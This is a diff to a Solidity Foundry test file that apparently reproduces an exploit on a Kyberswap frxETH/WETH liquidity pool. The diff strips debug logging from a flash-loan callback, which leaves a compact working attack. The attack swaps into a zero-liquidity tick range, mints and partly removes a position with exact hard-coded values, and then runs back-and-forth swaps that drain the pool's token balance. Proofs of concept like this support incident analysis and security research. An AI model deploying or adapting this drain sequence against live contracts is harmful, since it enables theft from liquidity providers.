@@ -76,58 +76,31 @@ contract Exploiter is Test {
 
     // core ///////////////////////////////////////////////////////////////////
     function _flashCallback(uint256 due) internal returns (bool) {
-        int256 __delta_0;
-        int256 __delta_1;
-
-        int256 __tick_distance;
-        uint24 __swap_fee;
-
-        uint160 __sqrtP;
         int24 __currentTick;
         int24 __nearestCurrentTick;
-
-        uint128 __baseL;
-        uint128 __reinvestL;
-        uint128 __reinvestLLast;
-
+        uint24 __swap_fee;
+        uint160 __sqrtP;
         uint256 __token_id;
 
-        // anti-snipping?
+        // approval is required to mint the position
         IERC20(_token0).approve(_manager, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
         IERC20(_token1).approve(_manager, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
 
-        (__sqrtP, __currentTick, __nearestCurrentTick,) = IKyberswapPool(_victim).getPoolState();
-        (__baseL, __reinvestL, __reinvestLLast) = IKyberswapPool(_victim).getLiquidityState();
-        emit log_named_uint("sqrtP", __sqrtP);
-        emit log_named_uint("baseL", uint256(__baseL));
-
         // step 1: move to a tick range with 0 liquidity
-        (__delta_0, __delta_1) = IKyberswapPool(_victim).swap(_attacker, int256(_amount), false, 0x100000000000000000000000000, "");
-        emit log_named_int("d0", __delta_0);
-        emit log_named_int("d1", __delta_1);
+        IKyberswapPool(_victim).swap(_attacker, int256(_amount), false, 0x100000000000000000000000000, "");
 
-        __tick_distance = IKyberswapPool(_victim).tickDistance(); // 1
         __swap_fee = IKyberswapPool(_victim).swapFeeUnits(); // 10
         
         // step 2: supply liquidity
         (__sqrtP, __currentTick, __nearestCurrentTick,) = IKyberswapPool(_victim).getPoolState();
-        (__baseL, __reinvestL, __reinvestLLast) = IKyberswapPool(_victim).getLiquidityState();
-        emit log_named_int("currentT", __currentTick);
-        emit log_named_uint("sqrtP", __sqrtP);
-        emit log_named_uint("baseL", uint256(__baseL));
         (__token_id,,,) = IKyberswapPositionManager(_manager).mint(IKyberswapPositionManager.MintParams(_token0, _token1, __swap_fee, __currentTick, 111310, [__nearestCurrentTick, __nearestCurrentTick], 6948087773336076, 107809615846697233, 0, 0, _attacker, block.timestamp));
-        
-        // step 3: remove liquidity (14938549516730950591 = (1/6) * liquidity)
-        (__baseL, __reinvestL, __reinvestLLast) = IKyberswapPool(_victim).getLiquidityState();
-        IKyberswapPositionManager(_manager).removeLiquidity(IKyberswapPositionManager.RemoveLiquidityParams(__token_id, 14938549516730950591, 0, 0, block.timestamp)); // __baseL / 6
+
+        // step 3: remove liquidity
+        IKyberswapPositionManager(_manager).removeLiquidity(IKyberswapPositionManager.RemoveLiquidityParams(__token_id, 14938549516730950591, 0, 0, block.timestamp));
 
         // step 4: back and forth swaps
-        (__delta_0, __delta_1) = IKyberswapPool(_victim).swap(_attacker, 387170294533119999999, false, 1461446703485210103287273052203988822378723970341, "");
-        (__delta_0, __delta_1) = IKyberswapPool(_victim).swap(_attacker, -int256(IERC20(_token1).balanceOf(_victim)), false, 4295128740, "");
-
-        // balances
-        emit log_named_uint("l0", IERC20(_token0).balanceOf(_victim));
-        emit log_named_uint("l1", IERC20(_token1).balanceOf(_victim));
+        IKyberswapPool(_victim).swap(_attacker, 387170294533119999999, false, 1461446703485210103287273052203988822378723970341, "");
+        IKyberswapPool(_victim).swap(_attacker, -int256(IERC20(_token1).balanceOf(_victim)), false, 4295128740, "");
 
         // repay the lender
         IERC20(_token1).approve(_lender, due);
@@ -176,9 +149,6 @@ contract KyberswapFrxEthWethPoolExploitTest is Exploiter, Logger {
 
     function testExploit() public {
         // track changes
-
-        // fund the attacker
-        deal(_token1, _attacker, 200e18);
 
         // log pre-exploit
         logBalances("before", "token0", "victim", _victim, _token0);
